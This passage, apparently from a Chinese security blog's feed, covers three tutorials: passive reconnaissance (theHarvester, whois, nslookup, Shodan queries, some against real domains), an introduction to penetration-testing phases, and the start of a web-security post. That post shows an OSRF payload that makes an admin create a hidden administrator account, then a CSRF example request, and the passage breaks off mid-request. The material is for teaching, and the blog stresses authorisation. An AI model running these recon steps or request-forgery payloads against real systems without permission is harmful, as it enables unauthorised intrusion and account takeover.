title="使用"></a>使用</h3><p>克隆网站很容易被追踪，同时被视为极具攻击性，没有事先获得授权的话，不要运用此工具！</p><ul><li>在终端启动HTTrack后，该程序将询问一系列基本问题，然后开始复制目标网站。在大部分情况下，你可以一直按回车键接受默认答案。</li><li>成功的复制至少需要输入项目名称和一个有效的URL才能复制。</li><li>完成问题的回答后，输入“Y”开始进行克隆。</li><li>因为我们创建的是网站的精确副本，必须考虑本地计算机上的可用空间，在开始复制之前，必须确保有足够的空间</li></ul><p>不管是把整个网站复制下来还是实时浏览网站，都要关注细节。一开始就应该不断总结记录你在目标网站中找到的信息，比如物理地址、电子邮箱、商业关系(伙伴关系)、员工的姓名、与社会化媒体的联系等等。</p><h3 id="进入被动侦察"><a href="#进入被动侦察" class="headerlink" title="进入被动侦察"></a>进入被动侦察</h3><p>有了目标的基本信息以后，就可以进入被动侦察阶段，被动侦察不会向目标系统发送任何数据包，在被动侦察中，我们所要用到的一个武器是互联网。首先要做的是利用各个搜索引擎对目标进行地毯式地搜索。(推荐使用google)</p><h2 id="The-Harvester：挖掘并利用邮箱地址"><a href="#The-Harvester：挖掘并利用邮箱地址" class="headerlink" title="The Harvester：挖掘并利用邮箱地址"></a>The Harvester：挖掘并利用邮箱地址</h2><ul><li>The Harvester可用于搜索Google/Bing/PGP服务器的电子邮件、主机以及子域名。还能搜索LinkedIn的用户名。</li><li>Kali本身已经内置了The Harvester。</li></ul><h3 id="使用The-Harvester"><a href="#使用The-Harvester" class="headerlink" title="使用The Harvester"></a>使用The Harvester</h3><p>在终端输入以下命令</p><pre class=" language-bash"><code class="language-bash">theharvester //启动theharvester,界面会展示相关参数及用法</code></pre><p>在终端输入：</p><pre class=" language-bash"><code class="language-bash">theharvester -d qq.com -l 10 -b baidu</code></pre><p>上述命令的解释：</p><ul><li><font color="#fb8c00">-d</font> 用来指定目标的域名(qq.com)</li><li><font color="#fb8c00">-l</font> 用来限定搜索结果的数目(10)</li><li><font color="#fb8c00">-b</font> 用来指定进行搜索的公共知识库(baidu)，如果不确定来源，可以选择使用<font color="#fb8c00">-b all</font>，同时搜索Harvester能够使用的知识库。</li></ul><p>以上命令将搜索关于qq.com的电子邮箱、子域名和主机。结果如下：<br><img src="https://i.postimg.cc/v8nCBBpH/1.jpg" alt="">                     <img src="https://i.postimg.cc/FsQ8Jv4b/2.jpg" alt=""><br>如果还想对<font color="#fb8c00">email.qq.com、m.v.qq.com</font>等子域名进行彻底侦察，则将上述命令中的<font color="#fb8c00">qq.com</font>替换成相应域名即可。</p><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p>利用Whois，可以获取与目标相关的具体信息，包括IP地址，公司DNS主机名以及地址和电话号码等联系信息。</p><h3 id="使用Whois"><a href="#使用Whois" class="headerlink" title="使用Whois"></a>使用Whois</h3><p>在终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash">whois target_domain   //target_domain为目标域名</code></pre><p>如果要获取与百度相关的具体信息，则在命令行输入以下命令：</p><pre class=" language-bash"><code class="language-bash">whois baidu.com</code></pre><p>所得到的结果如下：<br><img src="https://i.postimg.cc/QxkPQz82/3.jpg" alt=""></p><blockquote><p>注：需要特别留意DNS服务器。即上图中的(Name Server),可用下面所介绍的Host将其转换成IP地址。</p></blockquote><h2 id="Host工具"><a href="#Host工具" class="headerlink" title="Host工具"></a>Host工具</h2><p>做侦察时经常会收集到主机名，而不是IP地址。这时就需要<font color="#fb8c00">host</font>工具将IP地址翻译出来。<br>在终端中输入以下命令：</p><pre class=" language-bash"><code class="language-bash">host target_domain</code></pre><p>如果我们想把之前发现的baidu.com翻译为IP地址，可以在终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash">host baidu.com</code></pre><p>也可以反过来将IP地址翻译为主机名：</p><pre class=" language-bash"><code class="language-bash">host IP_Address</code></pre><p>可以使用以下命令查看Host帮助文档：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">man</span> host</code></pre><h2 id="从DNS中提取信息"><a href="#从DNS中提取信息" class="headerlink" title="从DNS中提取信息"></a>从DNS中提取信息</h2><ul><li>DNS(Domain Name Server,域名系统)：域名系统（服务）协议（DNS）是一种分布式网络目录服务，主要用于域名与IP 地址的相互转换，以及控制因特网的电子邮件的发送。(源于百度百科)</li><li>DNS是本地网络和互联网的核心组件。它的一个用途就是负责将域名翻译成IP地址。对于人类而言<font color="#fb8c00">google.com</font>比<font color="#fb8c00"><a href="http://74.125.95.105" target="_blank" rel="noopener">http://74.125.95.105</a></font>好记，对于计算机则相反。DNS就在两者中充当翻译。</li><li>DNS想要工作，必须首先掌握网络中每一台电脑的IP地址和对应域名。</li><li>DNS服务器上包含了它所知道的所有设备的IP地址及其对应的域名的记录信息，许多网络部署了多台DNS服务器，以保证冗余或负载平衡。因此，多台DNS服务器之间需要进行信息共享。这个“共享”过程正是通过区域传输(zone transfer)实现的，区域传输通常也叫AXFR，在这个过程中，一台DNS服务器将其所有域名与IP映射发送到另一台DNS服务器。这一过程允许多台DNS服务器保持信息同步。即使我们无法进行区域传输，仍然有必要考察一下被授权范围内的DNS服务器</li></ul><h3 id="NS-Lookup"><a href="#NS-Lookup" class="headerlink" title="NS Lookup"></a>NS Lookup</h3><p>NS Looup是检查DNS的首选工具，这个工具能查询到DNS服务器，并可能获得DNS服务器知道的各种主机的记录。Kali中已经内置了NS Lookup。<br>NS Lookup可以在交互的模式下运行，也就是说，先启动这个程序，然后再输入特定参数使其运行的特点。所以在终端输入如下命令就可运行NS Lookup</p><pre class=" language-bash"><code class="language-bash"><span class="token function">nslookup</span></code></pre><p>运行NS Lookup之后，我们输入以下命令：</p><pre class=" language-bash"><code class="language-bash">server 8.8.8.8 //输入想查询的DNS服务器的IP地址</code></pre><p>接着指明所要查询的记录类型。如果只想要查找一般性信息，可以使用关键字<font color="#fb8c00">any</font>，指定类型为任何类型：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> type<span class="token operator">=</span>any  //一定要注意空格，否则会出错</code></pre><p>如果你想查看DNS服务器的某些特殊信息，比如目标公司处理电子邮件的邮件服务器的IP地址(具体使用方法可以使用<font color="#fb8c00">man nslookup</font>命令查询)，就可以输入：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> type<span class="token operator">=</span>mx</code></pre><p>假如你想知道百度处理邮件时用的邮件服务器，前面我们通过whois已经发现了百度的DNS服务器，现对其中一个进行操作：<br><img src="https://i.postimg.cc/P556mrFD/4.jpg" alt=""><br>其中最后显示的五项都为百度的邮件服务器。</p><h2 id="筛选信息寻找可攻击的目标"><a href="#筛选信息寻找可攻击的目标" class="headerlink" title="筛选信息寻找可攻击的目标"></a>筛选信息寻找可攻击的目标</h2><p>整理信息时，建议创建一个简易的列表，用来集中记录收集到的IP地址。对于电子邮件地址、主机名称和URL地址等，还应该分别进行维护。仔细整理过手机来的侦察信息并把数据转换为可攻击的目标之后，我们就应该拥有一个IP列表，其中的IP地址就算不属于目标，至少也是相关的。<br>侦察阶段的最后一个是步骤是检查你所创建的IP列表，确认IP列表里的IP地址都在授权范围内。</p><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p>搜集信息的网站博主推荐Shodan、ZoomEye、FOFA。下面对Shodan进行详细介绍：</p><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul><li>Shodan是一个Internet连接设备的搜索引擎。Shodan搜集所有直接连接到Internet上的设备的信息，如果设备直接连接到Internet，则Shodan会查询该设备以获取各种公开可用的信息。</li><li>Shodan的不部分数据来自banner,banner是有关设备上运行的软件的元数据。</li></ul><h4 id="搜索查询基础"><a href="#搜索查询基础" class="headerlink" title="搜索查询基础"></a>搜索查询基础</h4><p>设备运行服务，这些服务就是Shodan所收集的信息。网站托管在运行Web服务的设备上，Shodan将通过与该Web服务对话来收集信息。每个服务的信息都存储在一个名为banner的对象中。banner是Shodan搜集的基本数据单位，其中也包含你想要搜索的信息，一个简单的banner如下所示：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span>    <span class="token string">"data"</span><span class="token keyword">:</span> <span class="token string">"Moxa Nport Device            Status: Authentication disabled            Name: NP5232I_4728            MAC: 00:90:e8:47:10:2d"</span>,    <span class="token string">"ip_str"</span><span class="token keyword">:</span> <span class="token string">"46.252.132.235"</span>,    <span class="token string">"port"</span><span class="token keyword">:</span> 4800,    <span class="token string">"org"</span><span class="token keyword">:</span> <span class="token string">"Starhub Mobile"</span>,    <span class="token string">"location"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>        <span class="token string">"country_code"</span><span class="token keyword">:</span> <span class="token string">"SG"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>上述banner有五个属性，每个属性都代表不同的含义：</p><ul><li><font color="#fb8c00">data</font> 服务本身的主要响应</li><li><font color="#fb8c00">ip_str</font> 设备的IP地址</li><li><font color="#fb8c00">port</font> 服务的端口号</li><li><font color="#fb8c00">org</font> 拥有这个IP空间的组织</li><li><font color="#fb8c00">location</font> 设备所在的位置</li></ul><p>Shodan默认只搜索data属性，data属性的内容因服务类型而不同，比如，下面是一个典型的HTTP banner：</p><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKServer: nginx/1.1.19Date: Sat, 03 Oct 2015 06:09:24 GMTContent-Type: text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>utf-8Content-Length: 6466Connection: keep-alive</code></pre><p>上述信息表示设备运行在版本号为1.1.19的配置Web服务软件上。</p><p>下面是西门子S7工厂控制协议的banner:</p><pre class=" language-bash"><code class="language-bash">Copyright: Original Siemens EquipmentPLC name: S7_TurbineModule type: CPU 313CUnknown <span class="token punctuation">(</span>129<span class="token punctuation">)</span>: Boot Loader           AModule: 6ES7 313-5BG04-0AB0  v.0.3Basic Firmware: v.3.3.8Module name: CPU 313CSerial number of module: S Q-D9U083642013Plant identification: Basic Hardware: 6ES7 313-5BG04-0AB0  v.0.3</code></pre><p>上述西门子S7协议提供了一个固件的信息。</p><blockquote><p>注：在利用Shodan进行搜索时，你必须先确定要搜索的设备类型，因为不同类型的banner之间的差别很大</p></blockquote><h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h4><p>以下述Moxa设备的banner为例：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span>    <span class="token string">"data"</span><span class="token keyword">:</span> <span class="token string">"Moxa Nport Device            Status: Authentication disabled            Name: NP5232I_4728            MAC: 00:90:e8:47:10:2d"</span>,    <span class="token string">"ip_str"</span><span class="token keyword">:</span> <span class="token string">"46.252.132.235"</span>,    <span class="token string">"port"</span><span class="token keyword">:</span> 4800,    <span class="token string">"org"</span><span class="token keyword">:</span> <span class="token string">"Starhub Mobile"</span>,    <span class="token string">"location"</span><span class="token keyword">:</span> <span class="token punctuation">{</span>        <span class="token string">"country_code"</span><span class="token keyword">:</span> <span class="token string">"SG"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如果你想知道更多关于这个Moxa Nport设备的信息，一个简单的查询可以为：</p><pre class=" language-bash"><code class="language-bash">Moxa Nport</code></pre><p>但是，如果你想搜索属于Starhub Mobile组织的所有设备，输入<font color="#fb8c00">Starhub Mobile</font>不会返回预期的结果，这是因为Shodan默认只搜索data属性的内容。</p><h4 id="搜索过滤器"><a href="#搜索过滤器" class="headerlink" title="搜索过滤器"></a>搜索过滤器</h4><p>搜索过滤器是你告诉Shodan具体想要搜索什么信息的关键字，过滤器的组成如下：</p><pre class=" language-bash"><code class="language-bash">filtername:value   //过滤器名与值之间没有空格</code></pre><p>如果你想搜索在新加坡的所有设备可以使用以下查询：</p><pre class=" language-bash"><code class="language-bash">country:SG   //country只接收两个字母的国家代码</code></pre><p>如果你想搜索在Starhub Mobile的所有设备可以使用以下查询：</p><pre class=" language-bash"><code class="language-bash">org:<span class="token string">"Starhub Mobile"</span>  //如果查询的值之间有空格要使用引号将其包起来</code></pre><p>过滤器也可以用来缩小查询范围，如，下面的查询将显示所有属于Starhub Mobile组织并且位于新加坡(城市)的所有设备：</p><pre class=" language-bash"><code class="language-bash">org:<span class="token string">"Starhub Mobile"</span> city:Singapore</code></pre><h4 id="网站导航"><a href="#网站导航" class="headerlink" title="网站导航"></a>网站导航</h4><p>Shodan网站有三种类型的服务：</p><ol><li>Shodan(<a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a>)</li><li>Shodan Maps(<a href="https://maps.shodan.io" target="_blank" rel="noopener">https://maps.shodan.io</a>)</li><li>Shodan Images(<a href="https://images.shodan.io" target="_blank" rel="noopener">https://images.shodan.io</a>)<br>上述网站都访问相同的Shodan数据但是却能达到不同的目的。</li></ol><h5 id="Main-Shodan-Website"><a href="#Main-Shodan-Website" class="headerlink" title="Main Shodan Website"></a>Main Shodan Website</h5><p>访问Shodan收集到的数据的最主要接口，是访问<a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a> ，搜索默认会查询过去30天内的结果<br>除了搜索，该网站该提供以下功能</p><ol><li>下载数据<br>搜索完成后，可以通过菜单栏的Download Results导出搜索得到的数据(如下图)<br><img src="https://i.postimg.cc/L8QxvKrb/5.jpg" alt=""><br>并且可以导出为不同的文件格式</li></ol><ul><li>JSON文件包含Shodan收集到的整个banner和所有元数据，这是首选的导出文件格式，因为它包含了所有有用信息，并且JSON文件与Shodan命令行客户端兼容，这意味着你可以从Shodan下载数据并利用终端进行进一步加工。</li><li>在你只关心banner基本信息并且需要快速下载这些信息并导出为外部文件(如Excel)时，将数据导出为CSV文件最合适。</li><li>XML文件是被弃用的导出文件格式，除非你有软件必须依赖于XML文件的数据，否则不要使用它<br>下载数据需要消耗export credits(需要进行购买)。</li></ul><ol start="2"><li><p>生成报告<br>网站允许你根据查询的结果生成报告，报告通过图表的形式向你展示结果的分布情况。该功能是免费的，可以通过菜单Download Results旁边的Create Report来实现。报告是根据目前的数据生成的，报告一旦生成就不会改变。</p></li><li><p>可以在社区(Explore)与其他人交流分享在Shodan获得的经验与方法。(注意不要分享违法敏感信息)</p></li></ol><blockquote><p>注：Shodan CLI能将shodan JSON数据文件转换为Excel电子表格</p></blockquote><h5 id="Shodan-Maps"><a href="#Shodan-Maps" class="headerlink" title="Shodan Maps"></a>Shodan Maps</h5><ul><li>Shodan Maps以图形化的形式呈现搜索结果，它一次呈现1000条结果。</li><li>在上面介绍过的过滤器在此模块仍然适用</li></ul><blockquote><p>注：可在kali的metasploit中直接使用shodan</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试知识点(1)</title>
      <link href="/2019/11/13/penetrationtest1/"/>
      <url>/2019/11/13/penetrationtest1/</url>
      
        <content type="html"><![CDATA[<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>博客里所有渗透测试有关文章都是博主参考各种书籍(《渗透测试实践指南：必知必会的工具与方法》、《Metasploit渗透测试与开发实践指南》、《Kali linux 2网络渗透测试实践指南》）并结合博主实践总结来进行书写的。渗透测试所有相关文章都是在kali linux上进行实践的。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>渗透测试：渗透测试是一种定位计算机系统并可对其成功实施漏洞攻击的方法，是合法且得到授权的行为，其目的是为了使这些受测系统更加安全。</li><li>测试过程包括漏洞探测和提供概念证明(Proof of Concept,POC)攻击，以证明系统漏洞确实存在。</li><li>渗透测试又被称为：</li></ol><ul><li>Pen Testing </li><li>PT</li><li>黑客活动(Hacking)</li><li>道德黑客(Ethical Hacking)</li><li>白帽黑客(White Hat Hacking)</li><li>威慑安全(Offensive security)</li><li>红队(Red Teaming)</li></ul><h3 id="渗透测试和漏洞评估"><a href="#渗透测试和漏洞评估" class="headerlink" title="渗透测试和漏洞评估"></a>渗透测试和漏洞评估</h3><ul><li>渗透测试(Penetration Testing):通过执行漏洞利用和概念证明(POC)攻击来证实系统确实存在安全隐患</li><li>漏洞评估(Vulnerability Assessment):检查系统和服务是否存在潜在的安全问题。<br>渗透测试能够模拟黑客行为并提供攻击有效载荷(payload),它比漏洞评估更进了一步。</li></ul><h3 id="白盒渗透测试"><a href="#白盒渗透测试" class="headerlink" title="白盒渗透测试"></a>白盒渗透测试</h3><ul><li>白盒渗透测试也称显性测试，这种测试非常全面彻底，其目标是检查目标系统或者网络的每个角落和裂缝，同时不需要关注隐身性，</li><li>这类测试的缺点是不能准确模拟大部分现代熟练攻击者的网络入侵行为，也不能为组织提供测试其故障响应或早期预警系统的机会。</li><li>测试者不尝试隐身攻击，他所考虑的是全面性。</li></ul><h3 id="黑盒渗透测试"><a href="#黑盒渗透测试" class="headerlink" title="黑盒渗透测试"></a>黑盒渗透测试</h3><ul><li>黑盒渗透测试也称隐性测试。这种测试更加逼真地模拟训练有素的攻击者试图获得目标系统和网络的方式。这种测试牺牲全面性和发现多个漏洞的能力，来换取隐身性和准确的描述。黑盒测试通常只需要测试者定位和攻击一个漏洞。</li><li>这类测试的优点是更接近于真实的攻击类型。现在没有多少攻击者会扫描目标的全部65536个端口，这样做会被防火墙或入侵检测者发现。熟练的恶意黑客更加谨慎，他们可能只扫描一个端口，或者请求一个服务，找到入侵和占有目标的途径。</li><li>黑盒测试还有一个优点是公司可以测试它的事故响应规程，确定防御措施是否能够检测和阻止攻击。</li></ul><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h3><p>APT(Advanced Package Tool)是一个打包管理系统。APT运行你使用命令行的方式，快速便捷地安装、更新、删除软件。除了简单以外，APT最大的优势是可以自动为你解析软件之间的依赖关系。也就是说，如果你安装的软件包还需要其他软件，APT会自动为你定位并安装这个软件。这种自动解析软件依赖性的方法是对过去“依赖地狱”(Dependency Hell)的重大改进。</p><p>如果我们想在Linux上安装工具，只要知道安装的软件包的名字A，在命令行输入：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> upgrade  //在软件安装前最好运行此命令，这样可以确保获得安装软件的最新版本<span class="token function">apt-get</span> <span class="token function">install</span> A</code></pre><p>APT要求在运行安装命令之前知所要安装软件的确切名称。如果不确定软件名称的拼写，可以使用<font color="#fb8c00">apt-cache search A</font>命令,它将显示任何匹配搜索的软件包或者工具名称。</p><blockquote><p>注：如果你对渗透测试或黑客感兴趣，就必须掌握linux。黑客常用的Linux操作系统一般有Kali linux。同时可以使用虚拟机安装上述系统。</p></blockquote><h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><p>打开终端，输入以下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ifconfig</span> -a  //ifconfig可以理解为“我想要配置一个端口”</code></pre><p>这条命令会把计算机上所有可用的接口以列表的形式罗列出来。大多数计算机至少多会有一个<font color="#fb8c00">eth0</font>网卡和一个<font color="#fb8c00">lo</font>接口。“eth0”口是计算机上的第一个以太网卡，“lo”接口是计算机的环回口。根据计算机的硬件配置，可能会有其他的接口或接口设备清单，如果你使用VM来运行kali，你的主接口一般就是eth0。</p><h4 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h4><h5 id="手动配置"><a href="#手动配置" class="headerlink" title="手动配置"></a>手动配置</h5><p>如果我们想给网卡分配一个IP地址192.168.1.23，在命令行中输入：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ifconfig</span> eth0 1 192.168.1.23</code></pre><h5 id="通过DHCP分配地址"><a href="#通过DHCP分配地址" class="headerlink" title="通过DHCP分配地址"></a>通过DHCP分配地址</h5><p>在命令行执行以下命令：</p><pre class=" language-bash"><code class="language-bash">dhclient</code></pre><p>dhclient会试图自动为你的NIC分配IP地址，并配置必要设置，包括DNS和网关信息。如果是在虚拟机中运行操作系统，那么虚拟机将充当DHCP服务器。</p><h3 id="关闭-重启Kali"><a href="#关闭-重启Kali" class="headerlink" title="关闭/重启Kali"></a>关闭/重启Kali</h3><p>在命令行输入以下命令：</p><pre class=" language-bash"><code class="language-bash">poweroff  //关闭<span class="token function">reboot</span>   //重启</code></pre><p>在完成渗透测试时，关闭或重启攻击机器都是很好的主意，这种好习惯可以避免在离开机器时无意中保持工具的运行，或者不恰当地发送流量。</p><h2 id="黑客实验环境的搭建与使用"><a href="#黑客实验环境的搭建与使用" class="headerlink" title="黑客实验环境的搭建与使用"></a>黑客实验环境的搭建与使用</h2><p>黑客实验环境就是一个沙箱环境，在这里流量和攻击被隔离，或者不会触及到未授权和未经同意的目标。搭建实验环境至少需要两台计算机：一台模拟攻击机器，一台模拟受攻击机器。还可以有其他配置方法。对黑客环境而言，最至关重要的一点是要保证网络隔离，你必须通过配置其网络环境来确保通信流量不会逃逸或流出本网络之外。</p><p>搭建沙箱环境，最简单最有效的方法是将你的网络与互联网断开：</p><ul><li>如果你使用的是物理机，那么通过调整以太网线缆和交换机来改变路由流量是最好的方法。另外要再三检查无线网卡是否关闭。继续下一步工作之前要经常检查你的网络是否存在潜在的流量泄露。</li><li>如果你使用的是虚拟机，只需关闭无线网卡并拔出网线，为网卡分配地址，物理机和虚拟机仍可互相通信，并确保没有攻击流量能流出你的物理机器。</li></ul><p>博主渗透测试采用的操作系统有3个：</p><ol><li>Kali:此VM作为攻击机器</li><li>Metasploitable：是一个Linux VM,本身以极不安全的方式创建。(下载网址： <a href="http://sourceforge.net/projects/metasploitable" target="_blank" rel="noopener">http://sourceforge.net/projects/metasploitable</a> )</li><li>Windows XP</li></ol><p>上述所列的各个系统都部署为一台笔记本上的VM，网络配置为所有机器属于同一子网，可以互相进行通信。</p><h2 id="渗透测试步骤"><a href="#渗透测试步骤" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h2><p>渗透测试的整个过程可以划分为一系列的步骤或阶段，各个步骤放在一起，就形成了一个全面的完成渗透测试的方法论。不同的方法论其步骤不尽相同。可以从众多方法论中选择最适合自己的那一个。为了简单起见，我们用以下四步来进行学习和摸索渗透测试：</p><h3 id="1-侦察"><a href="#1-侦察" class="headerlink" title="1.侦察"></a>1.侦察</h3><p>侦察：负责收集目标的信息</p><h3 id="2-扫描"><a href="#2-扫描" class="headerlink" title="2. 扫描"></a>2. 扫描</h3><ul><li>端口扫描：拥有目标的开放端口和可能已开启服务的列表</li><li>漏洞扫描：用于定位和识别在目标计算机上运行的软件和服务所存在的弱点</li></ul><h3 id="3-漏洞利用："><a href="#3-漏洞利用：" class="headerlink" title="3. 漏洞利用："></a>3. 漏洞利用：</h3><ul><li>本地漏洞利用：要求攻击者对计算机有物理访问权</li><li>远程漏洞利用：利用网络和系统进行，攻击者无法物理接触目标<br>以上两种攻击的最终目的通常都是完全管理权限，完全管理权限使黑客可以完全控制目标机器，可以安装新程序、禁用安全工具、复制、编辑或删除机密文档，还可以更改安全设置</li></ul><h3 id="4-维持访问"><a href="#4-维持访问" class="headerlink" title="4. 维持访问"></a>4. 维持访问</h3><p>通常，在漏洞利用阶段提供的攻击有效载荷只能为我们开启系统的临时访问权限。因为大多数有效载荷都是临时的，所以我们需要快速转向漏洞利用后措施，创建一个可以永久控制目标系统的后门进程。这个后门进程可以让我们的管理权限不会因为程序关闭或重新启动而消失。</p><h3 id="5-隐藏"><a href="#5-隐藏" class="headerlink" title="5. 隐藏"></a>5. 隐藏</h3><p>此步用于隐藏痕迹，销毁证据(许多方法论并不包含这一步，白盒测试也不包含这一步)</p><h3 id="渗透测试报告"><a href="#渗透测试报告" class="headerlink" title="渗透测试报告"></a>渗透测试报告</h3><p>以上步骤执行的先后顺序十分重要，因为每一步的输出或结果就是后续步骤的输入，以正确的顺序运行工具对执行一个全面且真实的渗透测试来说至关重要。<br>每一个渗透测试最后的工作就是编写报告。但是它并不作为渗透测试方法论中的一个正式步骤。</p><ul><li>渗透测试报告应该包含测试过程中发现的所有相关信息，还要说明测试实施的细节和测试内容。</li><li>报告应该尽可能地针对发现的安全问题给出缓解和解决方案。</li><li>每一个渗透测试都要包含一个总结。总结的目的就是对你的成果进行一个简短的、非技术性的概述</li><li>一定要注意报告对技术人员和非技术人员都要通俗易懂，千万别在报告中涉及太多技术细节。</li></ul><blockquote><p>注：入门渗透测试时使用漏洞扫描器可以帮助我们举一反三，但是随着技术提升，一名好的渗透测试者应放弃使用漏洞扫描器，因为它会成为你磨练“黑客心态”的阻碍。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(11)</title>
      <link href="/2019/11/11/websecurity11/"/>
      <url>/2019/11/11/websecurity11/</url>
      
        <content type="html"><![CDATA[<h2 id="诱使用户执行操作"><a href="#诱使用户执行操作" class="headerlink" title="诱使用户执行操作"></a>诱使用户执行操作</h2><p>我们将在下面介绍一些可用于诱使其他用户执行操作的方法，这些方法甚至可以用在已防范XSS攻击的应用程序中。</p><h3 id="请求伪造"><a href="#请求伪造" class="headerlink" title="请求伪造"></a>请求伪造</h3><p>这种类型的攻击也称为会话叠置(session riding)，它们与会话劫持攻击密切相关。在会话劫持攻击的过程中，攻击者截获一名用户的会话令牌，因而可以“作为”该用户适用应用程序。但是，通过伪造攻击，攻击者根本不需要知道受害者的会话令牌。相反，攻击者利用Web浏览器的正常行为劫持用户的令牌，并通过它提出用户并不不打算提出的请求</p><p>请求伪造漏洞分为两种类型：本站点和跨站点</p><h4 id="本站点请求伪造"><a href="#本站点请求伪造" class="headerlink" title="本站点请求伪造"></a>本站点请求伪造</h4><p>本站点请求伪造(On-Site Request Forgery,OSRF)是一种保存型XSS漏洞的常见攻击有效载荷。以消息公告牌应用程序为例，它允许用户提交可被其他用户查看的数据。该应用程序使用以下请求提交信息：</p><pre class=" language-bash"><code class="language-bash">POST /submit.phpHost: wahh-app.comContent-Length: 34type<span class="token operator">=</span>question<span class="token operator">&amp;</span>name<span class="token operator">=</span>daf<span class="token operator">&amp;</span>message<span class="token operator">=</span>foo</code></pre><p>这个请求将以下内容添加到消息页面中</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>tr<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/images/question.gif"</span><span class="token operator">></span><span class="token operator">&lt;</span>/td<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span>daf<span class="token operator">&lt;</span>/td<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span>foo<span class="token operator">&lt;</span>/td<span class="token operator">></span><span class="token operator">&lt;</span>/tr<span class="token operator">></span></code></pre><p>在这种情况下，假设应用程序已经对插入页面的任何特殊字符进行了正确的HTML编码(并认为它不会受到XSS攻击)。上述示例中，我们控制的仅仅是&lt; img&gt;标签目标的一部分内容，虽然我们无法破坏引用字符串，但是可以修改URL，使得查看消息的用户提出一个尝试提出任意一个本站点的GET请求。例如，在type参数中提交下面的值将会使任何查看消息的用户提出一个尝试创建新的管理用户的请求：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">..</span>/admin/newUser.php?username<span class="token operator">=</span>daf2<span class="token operator">&amp;</span>password<span class="token operator">=</span>0wned<span class="token operator">&amp;</span>role<span class="token operator">=</span>admin<span class="token comment" spellcheck="true"># //#终止了.gif后缀前面的URL</span></code></pre><p>如果一名普通用户被诱使提出攻击者专门设计的请求，攻击不会成功。但是如果管理员查看信息，攻击者就可以创建一个秘密账户。在此例中，虽然无法对其进行XSS攻击，但攻击者仍然能够成功执行OSRF攻击。</p><p>在将其合并到响应之前，尽可能严格地确认用户提交的输入，即可防止OSRF漏洞。例如，上面的示例中，应用程序对type参数是否有一组值或某一个特殊的值进行检查。如果应用程序必须接受无法预料的其他值，那么应阻止任何包含/ . ?&amp;与=的请求。<br>对这些字符进行HTML编码并不能有效防止OSRF攻击攻击，因为浏览器在请求目标的URL字符串之前，会首先对其进行解码。</p><h4 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h4><p>跨站点请求伪造(CSRF)中，攻击者只需创建一个看似无害的网站，致使用户的浏览器直接向易受攻击的应用程序提出一个请求，执行某种有利于攻击者的“无意”操作。<br>同源策略并不阻止一个网站向另一个域提出请求。但是，它确实阻止提出请求的网站处理跨域请求的响应。因此，正常情况下，CSRF攻击只是一种“单向”攻击。</p><p>以某个允许管理员使用以下请求创建新用户账户的应用程序为例：</p><pre class=" language-bash"><code class="language-bash">POST /auth/newUser.ashx HTTP/1.1Host: mdsec.netCookie: sessionId<span class="token operator">=</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="token punctuation">(</span>此处省略<span class="token punctuation">)</span>Content-Type: application/x-www-form-urlencodedContent-Length: 83realname<span class="token operator">=</span>daf<span class="token operator">&amp;</span>username<span class="token operator">=</span>daf<span class="token operator">&amp;</span>userrole<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>letmein1<span class="token operator">&amp;</span>confirmpassword<span class="token 